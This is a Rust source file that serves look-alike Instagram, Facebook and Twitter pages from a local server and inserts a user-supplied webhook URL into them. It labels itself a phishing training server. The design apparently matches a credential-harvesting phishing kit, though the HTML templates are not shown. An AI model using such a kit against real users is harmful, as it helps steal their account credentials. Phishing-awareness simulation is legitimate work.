use std::io::{Read, Write};
use std::net::TcpListener;
use serde::Serialize;

#[derive(Debug, Serialize)]
pub struct Server {
    pub url: String,
    pub port: u16,
}

const BASIC_PAGE: &str = include_str!("pages/basic.html");
const INSTAGRAM_PAGE: &str =  include_str!("pages/instagram.html");
const FACEBOOK_PAGE: &str =  include_str!("pages/facebook.html");
const TWITTER_PAGE: &str = include_str!("pages/twitter.html");




pub fn start_server(
    platform: String,
    webhook_url: String,
) -> Result<Server, String> {

    let listener = TcpListener::bind("127.0.0.1:0").map_err(|error| error.to_string())?;

    let address = listener.local_addr().map_err(|error| error.to_string())?;

    let port = address.port();

    let platform = platform.trim().to_lowercase();

    println!(
        "Phising training server started: http://127.0.0.1:{}",
        port
    );

    std::thread::spawn(move || {

        for incoming in listener.incoming() {

            let mut stream = match incoming {

                Ok(stream) => stream,

                Err(error) => {
                    eprintln!(
                        "Connection error: {}",
                        error
                    );

                    continue;
                }
            };


            // read the brpwser http resquest first
            let mut buffer = [0u8; 4096];

            if let Err(error) = stream.read(&mut buffer) {

                eprintln!(
                    "Request read error; {}", error
                );

                continue;
            }

            let body = page(&platform, &webhook_url);

            let response = format!(
                "HTTP/1.1 200 OK\r\n\
                 Content-Type: text/html; charset=UTF-8\r\n\
                 Content-Length: {}\r\n\
                 Cache-Control: no-store\r\n\
                 Connection: close\r\n\
                 \r\n\
                 {}",
                body.as_bytes().len(),
                body
            );

            if let Err(error) = stream.write_all(
                response.as_bytes()
            ) {

                eprintln!(
                    "Response Write error: {}",
                    error
                );

                continue;
            }

            let _ = stream.flush();
        }
    });

    Ok(Server {

        url: format!(
            "http://127.0.0.1:{}",
            port
        ),
        port
    })
}


fn page(platform: &str, webhook_url: &str) -> String {

    match platform {
        "basic" => BASIC_PAGE.replace("{{DS-HOOK}}", webhook_url),
        "instagram" => INSTAGRAM_PAGE.replace("{{DS-HOOK}}", webhook_url),
        "facebook" => FACEBOOK_PAGE.replace("{{DS-HOOK}}", webhook_url),
        "twitter" => TWITTER_PAGE.replace("{{DS-HOOK}}", webhook_url),
        _ => BASIC_PAGE.replace("{{DS-HOOK}}", webhook_url),
    }
}